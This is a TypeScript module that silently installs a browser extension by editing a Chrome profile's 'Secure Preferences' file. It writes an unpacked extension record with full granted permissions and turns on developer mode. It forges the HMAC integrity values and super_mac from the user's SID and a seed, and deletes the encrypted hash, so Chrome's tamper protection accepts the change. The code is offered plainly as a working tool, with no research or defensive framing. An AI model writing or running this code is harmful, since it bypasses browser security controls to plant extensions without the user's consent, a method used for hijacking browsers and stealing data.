import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import { execSync } from 'child_process';

function getTrimmedSid(): string {
  try {
    if (process.platform === 'win32') {
      const out = execSync('whoami /user /fo csv', { encoding: 'utf8' });
      // "User Name","SID"\r\n"pc\user","S-1-5-21-..."
      const match = out.match(/S-\d(-\d+)+/);
      if (match) {
        const sid = match[0];
        const lastHyphen = sid.lastIndexOf('-');
        return sid.substring(0, lastHyphen);
      }
    }
  } catch {}
  return 'S-1-5-21-123456789-123456789-123456789';
}

function getSeed(userDataDir: string): string {
  try {
    const localStatePath = path.join(userDataDir, 'Local State');
    if (fs.existsSync(localStatePath)) {
      const state = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
      if (state.protection && state.protection.preference_mac_seed) {
        return state.protection.preference_mac_seed;
      }
    }
  } catch {}
  // Fallback default seed if Local State lacks one yet
  return 'ChromeTrackedPreferencesSeedDefaultFallbackKey123456';
}

function canonicalJson(val: any): string {
  if (val === null || val === undefined) return '';
  if (typeof val !== 'object') {
    return JSON.stringify(val);
  }
  if (Array.isArray(val)) {
    // Sort array items if needed, or serialize compact
    return '[' + val.map(canonicalJson).join(',') + ']';
  }
  // Object: sort keys lexicographically
  const keys = Object.keys(val).sort();
  const parts: string[] = [];
  for (const k of keys) {
    const v = val[k];
    if (v === undefined || v === null) continue;
    // Remove empty dicts/lists per Chromium spec
    if (typeof v === 'object' && !Array.isArray(v) && Object.keys(v).length === 0) continue;
    if (Array.isArray(v) && v.length === 0) continue;
    parts.push(JSON.stringify(k) + ':' + canonicalJson(v));
  }
  return '{' + parts.join(',') + '}';
}

function hmacSign(seed: string, deviceId: string, prefPath: string, valueJson: string): string {
  const hmac = crypto.createHmac('sha256', Buffer.from(seed, 'utf8'));
  hmac.update(Buffer.from(deviceId, 'utf8'));
  hmac.update(Buffer.from(prefPath, 'utf8'));
  hmac.update(Buffer.from(valueJson, 'utf8'));
  return hmac.digest('hex').toLowerCase();
}

export function computeExtensionMac(seed: string, deviceId: string, extId: string, settingsObj: any): string {
  const prefPath = `extensions.settings.${extId}`;
  const jsonStr = canonicalJson(settingsObj);
  return hmacSign(seed, deviceId, prefPath, jsonStr);
}

export function computeSuperMac(seed: string, deviceId: string, macsDict: any): string {
  const jsonStr = canonicalJson(macsDict);
  return hmacSign(seed, deviceId, '', jsonStr);
}

export function injectExtensionIntoSecurePreferences(
  userDataDir: string,
  profileName: string,
  extId: string,
  extensionPath: string,
  manifest: any
): boolean {
  const profileDir = path.join(userDataDir, profileName);
  const securePrefPath = path.join(profileDir, 'Secure Preferences');
  
  if (!fs.existsSync(securePrefPath)) {
    // If Secure Preferences doesn't exist yet, create minimal structure
    fs.mkdirSync(profileDir, { recursive: true });
    fs.writeFileSync(securePrefPath, JSON.stringify({ extensions: { settings: {} }, protection: { macs: { browser: { extensions: { settings: {} } } } } }));
  }

  const raw = fs.readFileSync(securePrefPath, 'utf8');
  let prefs: any;
  try {
    prefs = JSON.parse(raw);
  } catch {
    prefs = {};
  }

  // Ensure structure
  prefs.extensions = prefs.extensions || {};
  prefs.extensions.settings = prefs.extensions.settings || {};
  prefs.extensions.ui = prefs.extensions.ui || {};
  prefs.extensions.ui.developer_mode = true;

  const nowEpoch = Math.floor(Date.now() / 1000) * 1000000 + 11644473600000000; // Windows epoch approx

  // Build standard unpacked extension settings record expected by Chromium
  const extSettings = {
    active_permissions: {
      api: manifest.permissions || [],
      explicit_host: manifest.host_permissions || manifest.permissions || [],
      scriptable_host: []
    },
    commands: {},
    creation_timestamp: String(nowEpoch),
    from_webstore: false,
    granted_permissions: {
      api: manifest.permissions || [],
      explicit_host: manifest.host_permissions || manifest.permissions || [],
      scriptable_host: []
    },
    incognito_split_mode: false,
    install_time: String(nowEpoch),
    location: 5, // UNPACKED_LOCATION
    manifest: manifest,
    old_name: manifest.name || 'Extension',
    path: extensionPath,
    state: 1, // ENABLED
    was_installed_by_default: false,
    was_installed_by_oem: false
  };

  prefs.extensions.settings[extId] = extSettings;

  // Compute MACs
  const seed = getSeed(userDataDir);
  const deviceId = getTrimmedSid();

  prefs.protection = prefs.protection || {};
  prefs.protection.macs = prefs.protection.macs || {};
  prefs.protection.macs.browser = prefs.protection.macs.browser || {};
  prefs.protection.macs.browser.extensions = prefs.protection.macs.browser.extensions || {};
  prefs.protection.macs.browser.extensions.settings = prefs.protection.macs.browser.extensions.settings || {};

  const extMac = computeExtensionMac(seed, deviceId, extId, extSettings);
  prefs.protection.macs.browser.extensions.settings[extId] = extMac;

  // Also developer_mode MACs
  prefs.protection.macs.browser.extensions = prefs.protection.macs.browser.extensions || {};
  prefs.protection.macs.browser.extensions.ui = prefs.protection.macs.browser.extensions.ui || {};
  prefs.protection.macs.browser.extensions.ui['developer_mode'] = hmacSign(seed, deviceId, 'extensions.ui.developer_mode', 'true');

  // Remove settings_encrypted_hash if present to trigger Chromium self-healing fallback
  if (prefs.protection.macs.browser.extensions.settings_encrypted_hash) {
    delete prefs.protection.macs.browser.extensions.settings_encrypted_hash;
  }

  // Compute super_mac
  const superMac = computeSuperMac(seed, deviceId, prefs.protection.macs);
  prefs.protection.super_mac = superMac;

  // Backup original before write
  fs.writeFileSync(securePrefPath + '.bak', raw);

  // Write updated Secure Preferences
  fs.writeFileSync(securePrefPath, JSON.stringify(prefs));
  return true;
}
